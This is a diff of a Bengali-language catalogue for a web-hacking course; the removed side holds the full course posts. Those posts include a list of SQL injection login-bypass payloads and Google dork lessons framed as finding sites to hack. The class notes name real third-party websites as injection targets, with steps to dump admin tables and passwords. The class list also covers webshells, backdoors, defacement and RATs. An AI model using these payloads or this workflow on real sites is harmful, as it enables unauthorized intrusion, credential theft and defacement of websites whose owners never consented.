@@ -1,2920 +1,1410 @@
-# Arena B66 Delta — Public Course Catalogue
-
-Updated: 2026-10-08. Archive serials are preserved. Private meeting access, restricted portal credentials and individual exam results are excluded.
-
-## এরিনা ওয়েব সিকিউরিটি CEHF এর কোর্সে রেজিস্ট্রেশনকৃত সবাইকে স্বাগতম।
-
-Date: 2026-07-12 · Category: information · ID: entry-15
-
-এরিনা ওয়েব সিকিউরিটি CEHF এর কোর্সে রেজিস্ট্রেশনকৃত সবাইকে স্বাগতম।
-এখানে আমরা সাইবার সিকিউরিটি বিষয়ক বিভিন্ন প্রশ্ন এবং ক্লাস পরবর্তি যে কোন সাহায্য সহযোগিতা নিয়ে আলোচনা করবো।
-আমাদের লক্ষ্য থাকবে, আগামী চার মাসের মাঝে যাতে গ্রুপের সবাই নিজেকে একজন সাইবার সিকিউরিটি স্পেশালিষ্ট হিসেবে গড়ে তুলতে পারে এবং নিজের ক্যারিয়ার গড়া সহ দেশের জন্য কিছু করতে পারে।
-অরিয়েন্টেশন ক্লাসঃ ১৯ জুলাই ২০২৬, রবিবার।
-রেগুলার ক্লাস শিডিউলঃ শুক্রবার এবং রবিবার, রাত ৯ঃ৩০টা থেকে রাত ১১ঃ৩০টা পর্যন্ত।
-প্র্যাকটিসঃ মঙ্গলবার। [প্রতি সপ্তাহে প্র্যাকটিস জমা দিতে হবে, একটানা দুই সপ্তাহ প্র্যাকটিস জমা না দিলে Authority কারন দর্শানো ছাড়াই সাসপেন্ড করার ক্ষমতা রাখেন।
-সাপোর্টঃ সপ্তাহের মঙ্গলবার সন্ধ্যা ৭ টা থেকে রাত ১ টা পর্যন্ত Live session, informative, remote desktop সাপোর্ট পাবেন। 
-যে ব্যাপার গুলো লক্ষ্য রাখতে হবেঃ
-○ ক্লাস শুরু হওয়ার ১০ মিনিটের মধ্যে কেউ উপস্থিত হতে ব্যার্থ হলে তার উক্তদিনের ক্লাস অনুপস্থিত হিসেবে গন্য হবে।
-○ বাংলাদেশী কোন ওয়েবসাইটে প্র্যাকটিস, কিংবা যে কোন ওয়েবসাইটের তথ্য সংযোজন কিংবা ক্ষতির সম্মুখীন হলে তার স্টুডেন্টশীপ সরাসরি বাতিল বলে ঘোষণা করা হবে।
-○ বিনা অনুমতিতে একাধারে দুইটি ক্লাস মিস দিলে এবং যথোপযুক্ত কারন দেখাতে না পারলে কোন ধরনের জবাবদিহি ছাড়াই ট্রেইনাররা ছাত্রত্ব বাতিল করার ক্ষমতা রাখে।
-○ ওরিয়েন্টেশন এবং প্রথম ক্লাস পর্যন্ত আপনি যদি মনে করেন, অনলাইনে সম্পূর্ণ সাপোর্ট পাচ্ছেন না অথবা পরিপূর্ণ ভাবে আউটলাইন সম্পন্ন হবে না, তাহলে সম্পুর্ণ ইনস্টল্ম্যান্ট রিফান্ড নিয়ে যেতে পারবেন। এর পরবর্তী সময়ে কোন আবেদন গ্রহণ যোগ্য হবে না।
-একমাত্র শর্তাবলী হচ্ছে আপনাকে অবশ্যই ক্লাস এবং হোমওয়ার্ক গুলো করতে হবে।
-রেজিস্ট্রেশন বাতিল করতে চাইলে শুক্রবার ২৪ই জুলাই ক্লাসের পর থেকে ২৫ জুলাই ২০২৬, রাত ১২ টা এর মধ্যে আপনাকে এরিনা ওয়েব সিকিউরিটির ইমেইলে (info@arenawebsecurity.net) আবেদন করতে হবে এর পরবর্তীতে কোন আবেদন গ্রহণযোগ্য হবে না।
-○ কোন প্রকার শৃংখলা পরিপন্থী কাজ করা যাবে না। যে কোন প্রকার অভ্যন্তরীন সমস্যা গুলো এডমিনকে ফোন/ ইমেইলে জানাবেন। গ্রুপে ঝামেলা সৃষ্টিকারী কেউ পরিলক্ষিত হলে, অথবা ছাত্রদের সমস্যা সৃষ্টি কারীদের কোন ধরনের জবাবদিহি ছাড়াই ট্রেইনাররা ছাত্রত্ব বাতিল করার ক্ষমতা রাখে। নিজেদের কারো সাথে ব্যাক্তিগত দন্দ্ব অথবা উস্কানিমূলক মন্তব্য করা যাবে না।
-কারন, আমরা এখানে শিখতে এসেছি। সবাই মিলেই একটা পরিবার। [ ট্রেইনার শিক্ষার্থী ] কেউ কারো সাথে হেয় প্রতিপন্নমূলক কিংবা মানহানিকর মন্তব্য করলে আমাদের পরিবারের সবাইকে অপমান করার শামিল।
-○ কোন ট্রেইনারকে স্যার ডাকার প্রয়োজন নেই। সেই সাথে ফরমালিটির ও প্রয়োজন নেই। আমরা চেষ্টা করি আপনাদের সাথে একাগ্র হয়ে যেতে, আপনারাও আমাদেরকে এই ব্যাপারে সম্পুর্ণ সহায়তা করবেন আশা করি।
-○ মনে রাখবেন, এখানে শুধু শিখার জন্যই আসেন নি। ক্যারিয়ার ডেভেলপ করার জন্যও এসেছেন। সুতরাং, কোন ক্লাস/লেকচার কখনোই অবহেলা করা যাবে না।
-○ ট্রেইনার কিংবা মডারেটরদেরকে ইনবক্স করা সম্পুর্ণ ভাবে নিষেধ। আপনার যে কোন সমস্যা গ্রুপ কিংবা অফিশিয়াল চ্যাটে জানাবেন। সম্মানিত মডারেটর আপনাকে সমাধান করে দিবেন।
-বিশেষ প্রয়োজনে info@arenawebsecurity.net এখানে ইমেইল করা যেতে পারে।
-○ যদি উপরের রুলস গুলো মেনে চলতে পারেন তাহলে আগামী চার মাসের মধ্যেই আমরা একঝাক মেধাবী সিকিউরিটি স্পেশালিষ্ট পেতে যাচ্ছি যারা নিজেদের ক্যারিয়ার সহ দেশের জন্য ও অনেক অবদান রাখতে পারবেন।
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1598190601883529)
-
-## হোমওয়ার্ক প্যানেল ব্যবহারের নির্দেশনা
-
-Date: 2026-07-17 · Category: classes · ID: entry-16
-
-আসসালামু আলাইকুম
-এরিনা ওয়েব সিকিউরিটি ৬৬ তম ডেল্টা ব্যাচের সকলকে জানাই স্বাগতম। আগামী রবিবার রাত ৯ টা ৩০ মিনিটে আপনাদের ওরিয়েন্টেশন ক্লাস আনুষ্ঠানিকভাবে অনুষ্ঠিত হবে। তাই সবাইকে যথাসময়ে ফেসবুক গ্রুপে ফলোআপ রাখার জন্য বলা হচ্ছে। এর পাশাপাশি
-আসুন দেখে নেই কিভাবে আমরা আমাদের হোমওয়ার্ক প্যানেল ব্যবহার করতে পারি।
-https://drive.google.com/file/d/1vYQORaAT5jfQJY9BCYIR-sDQR671CzsD/view?usp=sharing
-0:00 / 14:38
-
-- [Resource](https://drive.google.com/file/d/1vYQORaAT5jfQJY9BCYIR-sDQR671CzsD/view)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1601798241522765)
-
-## অরিয়েন্টেশন ক্লাস শুরু হয়ে গেছে, সবাই শুধুমাত্র এই লাইভেই জয়েন করুন। আমি পর্যায়ক্রমে সকল দিক নির্…
-
-Date: 2026-07-19 · Category: information · ID: entry-14
-
-অরিয়েন্টেশন ক্লাস শুরু হয়ে গেছে, সবাই শুধুমাত্র এই লাইভেই জয়েন করুন। আমি পর্যায়ক্রমে সকল দিক নির্দেশনা দিয়ে দিচ্ছি। ধন্যবাদ।
-posted to
-Admin
-·
-Orientation Class: B66 Delta
-
-- [Resource](https://www.facebook.com/groups/awsb66delta/posts/1604083781294211/)
-- [Resource](https://www.facebook.com/groups/awsb66delta/)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604083781294211)
-
-## Class 1 — Orientation — কোর্স পরিচিতি
-
-Date: 2026-07-19 · Category: recordings · ID: entry-20
-
-ক্লাস রেকর্ড
-১৯/০৭/২০২৬
-drive.google.com
-Orientation class.mp4
-
-- [Resource](https://drive.google.com/file/d/14EMX0Zu6BxqhlA8RAyqb3S7RChiKVB5z/view)
-
-## INFORMATIONAL POST -01
-
-Date: 2026-07-20 · Category: information · ID: entry-13
-
-INFORMATIONAL POST -01
-1 'or' 1 '=' 1 দিয়ে Site Access হলো কেন?
-User: 1 'or' 1 '=' 1
-Pass: 1 'or' 1 '=' 1
-কেন বা কিভাবে কাজ করে?
-ছোট একটা গল্প বলি -
-ছাত্র অবস্থায় একদিন প্লেইয়িং কার্ড এর একটি গেম খেলছিলাম, নামটি হলো 29(যদিও এটি গামছা বিছানো গেম!! এখন তেমন কেউ আর খেলেনা, আগে তো এই রকম ইন্টারনেট বা ফেসবুক বা ইন্টার নেট গেম তেমন ছিলনা, তখন ঐ টাই ছিল টিপি(মানে টাইম পাস!!))। এটা জুটি বদ্ধ গেম, ২জন করে পার্টনার থাকে, ৪ জনে খেলতে হয়!! ১৬ থেকে ডাক শুরু হয় এবং যে বেশী ডাক দিতে পারে সেই একটি কালার করে হাইড করে রাখে। পরে ঐ কালার দিয়ে ট্রাম করা যায়।।
-যাই হোক প্রতিপক্ষে এক বন্ধু ছিল, সে খেলার পাগল, কার্ড হাতে পাওয়ার পর কত যে হিসাব করতো আল্লাহই জানে!! কার্ডে তার চরম মনোনিবেশ থাকতো, আশেপাশে কি হচেছ সে তা মাথায় ই থাকতো না।।
-তো খেলার এক চরম মুহুর্তে তাকে বল্লাম ঐ কালার কি স্পেইড করেছিস?? সে খেলায় এতটা মগ্ন কিছু না বুঝেই বলে দিল- না, হার্টস
-তো বুঝেন!! সে আসলে খেয়াল ই করেনি- আমি তাকে একটা ফলস্‌ কুয়েরী দিয়েছি আর সে সেটা না বুঝে সত্যি সত্যি কালার বলে দিল,,যার ফলে গেমটি সে হেরে গেল।।
-এখানেও বিষয়টা এই রকমই প্রায়। প্রতিটা ওয়েভ সাইটে ১টি ডাটাবেস আছে, সেই ডাটাবেসে ইউজার নেম, পাসওয়ার্ড ষ্টোর করা আছে।
-যখন আমরা সাইটের লগ-ইন পেইজে ইউজার নেইম দেই পাসওয়ার্ড দেই সে সাইটের ডাটাবেস এ ষ্টোরকৃত ডাটা থেকে ইউজার নেম + পাসওয়ার্ড মিলিয়ে সঠিক হলে এক্সেস দিবে, আর না ম্যাচ হলে বলবে ইউজার নেইম বা পাসওয়ার্ড নট ম্যাচ, বা wrong password ।
-আমরা কি করলাম সাইটের উইজার নেইম এবং পাসওয়ার্ড এর জায়গায় ইউজার নেইম বা পাসওয়ার্ড না দিয়ে মিলিসিয়াস কোড (malicious code) দিয়ে ফলস্‌ কুয়েরি দিলাম, আমার বন্ধুটির মতো কুয়েরীটি না বুঝে সাইটে এক্সেস দিয়ে দিল
-ভালনেরাবল(Vulnerable) লগ ইন পেইজ গুলোতে এই বাইপাস অথেন্টিক্যাশন মেথড টি কাজ করবে।
-আচ্ছা শুধু 1 'or' 1 '=' 1 এটা কেন অন্য কিছু দিয়ে হতো না?
-হ্যাঁ, হতেই পারে, নিচের গুলো দিয়েও ট্রাই করতে পারেন।
-' or 1=1#
-or 1=1
-" or ""="
-or 1=1--
-or 1=1#
-or 1=1/*
-admin' --
-admin' #
-admin'/*
-admin' or '1'='1
-admin' or '1'='1'--
-admin' or '1'='1'#
-admin' or '1'='1'/*
-admin'or 1=1 or ''='
-admin' or 1=1
-admin' or 1=1--
-admin' or 1=1#
-admin' or 1=1/*
-admin') or ('1'='1
-admin') or ('1'='1'--
-admin') or ('1'='1'#
-admin') or ('1'='1'/*
-admin') or '1'='1
-admin') or '1'='1'--
-admin') or '1'='1'#
-admin') or '1'='1'/*
-কখনো কখনো user Name: admin password: admin দিয়েও কাজ করে।
-আবার যেসকল ইউজার নেম ই-মেইল এ্রড্রেস ছাড়া একসেপ্ট করে না সেগুলোতে যে কোন ই-মেইল ও উপরের পাসওয়ার্ড দিয়ে ট্রাই করতে পারেন।
-যেমনঃuser: admin@abul.net বাmofiz@hack.com
-Password: উপরের পাসওয়ার্ড থেকে দিয়ে দিন।
-এটা নিছক গল্প..
-কিছুদিন পর এমনিতেই বুঝে যাবেন (স্পেশালী ম্যানুয়্যাল এসকিউএল এর ক্লাসের পর), তারপরও না বুঝলে তখন একটি ভিডিও করে দিবনে।
-তারপরও কারো আগ্রহ থাকলে ঘুরে আসুন ডাব্লিউ ‍থ্রি স্কুল থেকে- https://www.w3schools.com/sql/sql_injection.asp
-
-- [Resource](https://www.w3schools.com/sql/sql_injection.asp)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604208154615107)
-
-## আসুন, জেনে নেই -১
-
-Date: 2026-07-20 · Category: information · ID: entry-25
-
-আসুন, জেনে নেই -১
-ভালনেরাবিলিটি (Vulnerability) কি?
-ভালনেরাবিলিটি হচ্ছে কোনো সিস্টেমের দূর্বলতা বা ভুল বা নিরাপত্তার ছিদ্রসমূহ। অর্থাৎ সিস্টেমটি কোনোভাবে বা কোনো কৌশলে আক্রমণযোগ্য।
-কোন সাইট এর ভালনেরাবিলিটি থাকা মানে হচ্ছে সাইটটি হ্যাক হওয়ার সুযোগ রয়েছে অথবা সাইটটির সিকিউরিটির কোন একটি দিকে দুর্বলতা রয়েছে। তবে কোন সাইটের ভালনেরাবিলিটি থাকার এই মানে নয় যে এটিকে হ্যাক করা যাবেই। তবে সুযোগ থাকার সম্ভাবনা রয়েছে।
-ভালনেরাবিলিটি(Vulnerability) সাইট কিভাবে খুঁজবো?
-ভালনেরাবিলিটি(Vulnerability) বা ত্রুটিযুক্ত সাইট খুঁজে বের করার উপায় হচ্ছে গুগল ডর্ক। যে যত ইউনিক এবং স্পেসিফিক ডর্ক বানাতে পারবে সে তত বেশী সাইট পাবে। যে যত বেশী সাইট পাবেন তত বেশী সাইট হ্যাক করার পসিবিলিটি হবে।
-গুগল ডর্ক(Google Dork) :
-গুগল হলো একটি সার্চ ইঞ্জিন। কোন কিছু খুঁজে পেতে আমরা গুগলের সাহায্য নেই এবং আমাদের প্রয়োজনীয় তথ্য খুঁজে বের করি।
-মনে করুন Ayub Bachchu এর ”হাসতে দেখো” গান দেখতে চাই বা শুনতে চাই তাহলে কি করতে পারি?
-গুগলে গিয়ে Ayub Bachchu লিখে সার্চ দিলে Ayub Bachchu রিলেটেড অনেক গান, তথ্য আসবে, সেখান থেকে খুঁজে বের করতে হবে হাসতে দেখো” গানটি, অনেক সময় লেগে যাবে, তাইনা?
-এবার যদি”হাসতে দেখো”Ayub Bachchu লিখে সার্চ দেই তাহলে কি হবে? খুব সহজেই পেয়ে যাব, তাইনা!
-গুগল ডর্ক হল এক ধরনের এডভান্সড সার্চ করার পদ্ধতি যা দিয়ে আপনি স্পেসিফিক তথ্যগুলো আলাদা করে নিয়ে আসতে পারবেন।
-এই এডভান্স ও স্পেসিফিক বা স্মার্ট সার্চের জন্য কিছু অপারেটর ব্যবহার করতে হয়।
-গুগল ডর্ক এর কমন কিছু অপারেটরঃ
-inurl: এই শব্দ দিয়ে শুরু করে আপনি যাই লিখবেন, তা কোন সাইটের এড্রেসে খুঁজে পেলে গুগল আপনাকে সার্চ রেজাল্ট হিসাবে দেখাবে।(url মানে হলো ওয়েভ এড্রেস, যেমনঃ https://www.facebook.com/ArenaBangladesh)
-উদাহরনঃ inurl:"login.php" এর মানে হলো- ঐ সব সাইট সার্চ করো যে সব সাইটের ওয়েভ এড্রেসেlogin.php আছে, যেমন-
-এই ধরনের সাইটগুলো দেখাবে।https://olportal.ontariolearn.com/login.php
-intitle: এ কিছু ডাটা দিলে, সেসব সাইটের টাইটেলে ঐ শব্দ পাবে গুগল আপনাকে সেই সাইটগুলোই দেখাবে।
-উদাহরনঃintitle: “login page” এর মানে হলো- ঐ সব সাইট সার্চ করো যে সব সাইটের টাইটেলেlogin page আছে,
-যেমন- http://testphp.vulnweb.com/login.php
-intext: এর পর যে টেক্সট লিখে সার্চ দিলে, যে সব সাইটে ঐ টেক্সট পাবে গুগল সেই সব সাইট খুঁজে বের করে দিবে।
-উদাহরনঃ intext:"Design & Developed By Seawind Solution Pvt.Ltd."এর মানে হলো- ঐ সব সাইট সার্চ করো যে সব সাইটেDesign & Developed By Seawind Solution Pvt.Ltd. এই টেক্সট আছে,
-যেমন- https://www.aaa.co.in/page/services
-site: কোন ডোমেইন স্পেসিফাই করে দিতে বা নির্দিষ্ট কোন সাইট ব্যবহার করা হয়।
-উদাহরনঃ site:octa.net এর মানে হলো- octa.net সাইট এর মধ্যকার ডাটা সার্চ করা, এটা ডোমেইন ও হতে পারে যেমনঃ.com বা.net ইত্যাদি।
-আবার কোন ডর্কে একাধিক অপারেটরও ব্যবহার করা হতে পারে।
-যেমনঃ
-intitle:"index" of "admin" site:.in
-যে সকল পেইজের টাইটেলেindex" of "admin আছে এবং সাইটগুলো ইন্ডিয়ার শুধু সেসকল সাইট খুঁজে বের করার জন্য ডর্ক।
-inurl:"login.php" site:.in
-intitle: “login page” site:.in
->> গুগল ডর্ক কোন হ্যাকিং নয়।
-তবে গুগল ডর্ক হলো হ্যাকিংয়ের প্রাথমিক ধাপ (হ্যাক করার জন্য সাইট বা লিংক খুঁজে বের করা)।
-ধন্যবাদ।
+# Delta Archive — পোস্ট ও রিসোর্স ক্যাটালগ
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604210557948200)
+হালনাগাদ: 2026-10-13
 
-## মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
+24টি মূল ক্লাস এবং 198টি পোস্ট/রিসোর্সের বর্তমান সূচি। পূর্ণ লেখা ও নোট সাইট এবং data.json-এ আছে। এটি নতুন করে সকল মূল পোস্ট/ভিডিও সম্পূর্ণ যাচাই হয়েছে—এমন দাবি নয়।
 
-Date: 2026-07-21 · Category: information · ID: entry-29
+## ক্লাসের সিরিয়াল
 
-মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
-কি অবস্থা সবার কেমন আছেন?
-আজকে মঙ্গলবার আপনাদের প্র্যাকটিস ডে..!
-আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশাপাশি আপনার যদি কোন প্রশ্ন থাকে তাও করতে পারেন। অথবা আপনি চাইলে নিম্নোক্ত টাইমে সরাসরি লাইভ সাপোর্ট সেশনে জয়েন করে নিতে পারেন।
-Meet-এ যোগদানের তথ্য:
-সময়:
-প্রথম সেশন:
-সন্ধ্যা ৭টা থেকে রাত ৯ টা পর্যন্ত
-দ্বিতীয় সেশন:
-রাত ১০ থেকে মধ্য রাত ২ টা পর্যন্ত
-লিঙ্ক:
-To join the video meeting, click this link:
-[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
-কিভাবে সাহায্য পাবেন:
-আপনি চাইলে মঙ্গলবার সারাদিন সাপোর্ট পোস্টের কমেন্টের মাধ্যমে যোগাযোগ করে আপনার প্রবলেমের বিষয় জানিয়ে সমস্যার সমাধান নিতে পারেন অথবা উল্লেখিত নির্দিষ্ট সময়ের মধ্যে মিটিংয়ে জয়েন করে সমস্যার সমাধান নিতে পারবেন।
-ধন্যবাদ।
+| ক্লাস | টপিক | ক্লাসের তারিখ | ভিডিও | পূর্ণ সামারি |
+|---|---|---|---|---|
+| 1 | [Orientation — কোর্স পরিচিতি](https://arena-b66-delta-archive.vercel.app/#class/entry-20) | 2026-07-19 | হোস্ট করা আছে | ট্রান্সক্রিপ্ট যাচাই হয়েছে |
+| 2 | [Cyber Safety ও SQL Injection by Tools](https://arena-b66-delta-archive.vercel.app/#class/entry-40) | 2026-07-24 | হোস্ট করা আছে | ট্রান্সক্রিপ্ট যাচাই হয়েছে |
+| 3 | [OSINT — Open Source Intelligence](https://arena-b66-delta-archive.vercel.app/#class/entry-46) | 2026-07-26 | হোস্ট করা আছে | ট্রান্সক্রিপ্ট যাচাই হয়েছে |
+| 4 | [Session hijacking, blocking ও Mid Exam প্রস্তুতি](https://arena-b66-delta-archive.vercel.app/#class/entry-58) | 2026-07-31 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 5 | [Manual SQL Injection](https://arena-b66-delta-archive.vercel.app/#class/entry-64) | 2026-08-02 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 6 | [Cross Site Scripting (XSS)](https://arena-b66-delta-archive.vercel.app/#class/entry-80) | 2026-08-09 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 7 | [SQLi WAF ও IDS](https://arena-b66-delta-archive.vercel.app/#class/entry-88) | 2026-08-14 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 8 | [Burp Suite — Proxy ও Intruder](https://arena-b66-delta-archive.vercel.app/#class/entry-90) | 2026-08-16 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 9 | [WebShell, Backdoor ও Deface Page](https://arena-b66-delta-archive.vercel.app/#class/entry-99) | 2026-08-21 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 10 | [File Upload Vulnerabilities](https://arena-b66-delta-archive.vercel.app/#class/entry-107) | 2026-08-23 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 11 | [PortSwigger Labs — SQLi, XSS ও File Upload](https://arena-b66-delta-archive.vercel.app/#class/entry-115) | 2026-08-28 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 12 | [Acunetix — Scanner Setup ও Reports](https://arena-b66-delta-archive.vercel.app/#class/entry-112) | 2026-08-30 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 13 | [Batch Scripting](https://arena-b66-delta-archive.vercel.app/#class/entry-117) | 2026-09-04 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 14 | [Linux Installation ও Virtual Lab Setup](https://arena-b66-delta-archive.vercel.app/#class/entry-122) | 2026-09-06 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 15 | [Linux Command Line](https://arena-b66-delta-archive.vercel.app/#class/entry-124) | 2026-09-11 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 16 | [Crypter, Antivirus ও RAT Lab](https://arena-b66-delta-archive.vercel.app/#class/entry-126) | 2026-09-13 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 17 | [LFI ও Web Server Security Lab](https://arena-b66-delta-archive.vercel.app/#class/entry-132) | 2026-09-18 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 18 | [Kali Tools Setup — Java, Go ও Burp Suite](https://arena-b66-delta-archive.vercel.app/#class/entry-134) | 2026-09-20 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 19 | [Advanced LFI, Path Traversal ও RCE Lab](https://arena-b66-delta-archive.vercel.app/#class/entry-142) | 2026-09-25 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 20 | [WordPress, phpMyAdmin ও Elementor](https://arena-b66-delta-archive.vercel.app/#class/entry-145) | 2026-09-27 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 21 | [Recon — VPS ও Shodan Setup](https://arena-b66-delta-archive.vercel.app/#class/entry-147) | 2026-10-02 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 22 | [WordPress Backup, Wordfence Malware Scan ও XAMPP Lab](https://arena-b66-delta-archive.vercel.app/#class/entry-148) | 2026-10-04 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 23 | [Recon Part 2 — Web Application ও Directory Discovery](https://arena-b66-delta-archive.vercel.app/#class/class-2026-10-09) | 2026-10-09 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
+| 24 | [SQLMap ও Dalfox — SQL Injection ও XSS Tools](https://arena-b66-delta-archive.vercel.app/#class/class-2026-10-11) | 2026-10-11 | হোস্ট করা আছে | পূর্ণ বিশ্লেষণ বাকি |
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1604959244539998)
+## সব পোস্ট ও রিসোর্স
 
-## সবাই ক্লাসে চলে আসুন।
+### entry-15 — এরিনা ওয়েব সিকিউরিটি CEHF এর কোর্সে রেজিস্ট্রেশনকৃত সবাইকে স্বাগতম।
 
-Date: 2026-07-24 · Category: notices · ID: entry-12
+বিষয়: Orientation · তারিখ: 2026-07-12 · ধরন: information
 
-সবাই ক্লাসে চলে আসুন।
-posted to
-Admin
-·
-Cyber Safety, SQL Injection by tools
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-15)
 
-- [Resource](https://www.facebook.com/groups/awsb66delta/posts/1608140980888491/)
-- [Resource](https://www.facebook.com/groups/awsb66delta/)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608140980888491)
+### entry-16 — হোমওয়ার্ক প্যানেল ব্যবহারের নির্দেশনা
 
-## First class: Cyber Safety, SQL Injection by tools
+বিষয়: Orientation · তারিখ: 2026-07-17 · ধরন: classes
 
-Date: 2026-07-24 · Category: documents · ID: entry-39
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-16)
 
-ডিরেক্ট ক্লাস রিসোর্স লিংক
-docs.google.com
-First class: Cyber Safety, SQL Injection by tools
+### entry-14 — অরিয়েন্টেশন ক্লাস শুরু হয়ে গেছে, সবাই শুধুমাত্র এই লাইভেই জয়েন করুন। আমি পর্যায়ক্রমে সকল দিক নির্…
 
-### Notes
+বিষয়: Orientation · তারিখ: 2026-07-19 · ধরন: information
 
-First class: Cyber Safety, SQL Injection by tools
-Batch: 66, Delta
-—----------------------------------------------------------------------------------------------------
-Attendance: https://forms.gle/G7FY71jBU996kuaB8
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-14)
 
+### entry-20 — Orientation — কোর্স পরিচিতি
 
-সবাই এই ফর্ম থেকে উপস্থিতি দিয়ে দিন। সময়ঃ ৯ টা ৪৫ পর্যন্ত।
-—----------------------------------------------------------------------------------------------------
+বিষয়: Orientation · তারিখ: 2026-07-19 · ধরন: recordings
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-20)
 
+### entry-13 — INFORMATIONAL POST -01
 
+বিষয়:  · তারিখ: 2026-07-20 · ধরন: information
 
-http://estuarydispatch.site/article.php?id=2
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-13)
 
+### entry-25 — আসুন, জেনে নেই -১
 
+বিষয়: Vulnerability Basics · তারিখ: 2026-07-20 · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-25)
 
-Sec 1.1   
-===================================================
+### entry-29 — মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
 
-Site: https://native.edu.pk/
-Point: http://native.edu.pk/detail.php?ComCatID=11
-Dork: php?id= site:
-php?id= site:https://native.edu.pk/
+বিষয়:  · তারিখ: 2026-07-21 · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-29)
 
-'
-Point: http://native.edu.pk/detail.php?ComCatID=11
-Get the details
+### entry-12 — সবাই ক্লাসে চলে আসুন।
 
+বিষয়: SQL Injection · তারিখ: 2026-07-24 · ধরন: notices
 
-analyze - tables - get tables - (select account db / admin / user / userinfo ) get column - ( select username password ) get data 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-12)
 
+### entry-39 — First class: Cyber Safety, SQL Injection by tools
 
-b0000000000000000000oOOO0m xD 
+বিষয়: SQL Injection · তারিখ: 2026-07-24 · ধরন: documents
 
-===================================================
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-39)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/entry-39.txt)
 
+### entry-40 — Cyber Safety ও SQL Injection by Tools
 
+বিষয়: SQL Injection · তারিখ: 2026-07-24 · ধরন: recordings
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-40)
 
-Sec 1.2   
-===================================================
+### entry-11 — আসুন জেনে নেই - ২
 
-Site: http://www.embryohotel.com
-Point: http://www.embryohotel.com/room-detail.php?id=1
-Dork: php?id= site:
-php?id= site:http://www.embryohotel.com
+বিষয়: SQL Injection · তারিখ: 2026-07-25 · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-11)
 
-'
-Point: http://www.embryohotel.com/room-detail.php?id=1
-Get the details
+### entry-10 — অফিশিয়াল যে কোন নোটিশ পেতে Arena Web Security পেজে লাইক দিয়ে রাখুন।
 
+বিষয়:  · তারিখ: 2026-07-26 · ধরন: notices
 
-analyze - tables - get tables - (select account db / admin / user / userinfo ) get column - ( select username password ) get data 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-10)
 
+### entry-46 — OSINT — Open Source Intelligence
 
-b0000000000000000000oOOO0m xD 
+বিষয়: OSINT · তারিখ: 2026-07-26 · ধরন: recordings
 
-===================================================
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-46)
 
+### entry-9 — আসুন গুগল ডর্ক সম্পর্কে একটু জেনে নেই!!
 
+বিষয়: Google Dork · তারিখ: 2026-07-27 · ধরন: information
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-9)
 
-Sec 2 Official CW:
-===================================================
-http://www.siemerc.com.br/site/evento.php?id=2
+### entry-47 — হাভিজ এর পোর্টেবল ভার্সান।
 
+বিষয়: SQL Injection · তারিখ: 2026-07-27 · ধরন: tools
 
-CW Submit: [সীমিত প্রবেশাধিকার]
